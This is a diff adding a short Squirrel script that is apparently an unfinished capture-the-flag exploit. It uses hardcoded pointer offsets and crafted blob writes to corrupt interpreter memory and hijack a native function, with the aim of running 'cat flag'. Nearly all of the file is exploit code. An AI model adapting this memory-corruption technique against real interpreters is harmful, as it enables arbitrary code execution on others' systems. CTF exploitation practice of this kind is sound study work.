@@ -1,0 +1,29 @@
+local p=0xAF5   // ptr1 = 0x100 before strip closure
+local q=0xAFA   // ptr2 = strip native function (sqstdlib)
+local r=0xAFB   // name
+local s=blob(144)
+//local myAwesomeOffset = 0x3DF0 // previously 0x36D0
+p += 0
+q += 0
+printf("%x\n", p)
+printf("%x\n", q)
+print(r)
+print(strip)
+print(s)
+s.writen(0x8000200,'l')
+//s.writen(p + 0x110 + 0xC270,'l')
+
+//s.writen(0x5000002,'l')
+s.writen(p + 0x110 - 0xAF40 + 16 * 0xB98,'l')
+s.writen(0, 'l')
+s.writen(2, 'l')
+
+s.seek(0x78)
+s.writen(q - 0xE040 + 0xEF90, 'l')
+
+local t=0xB98 // need to determine this value??
+t("cat flag")
+//printf("\n%x\n", t)
+//print("t="+t)
+//print("\n")
+//print("abc" + t("   def   ") + "ghi")
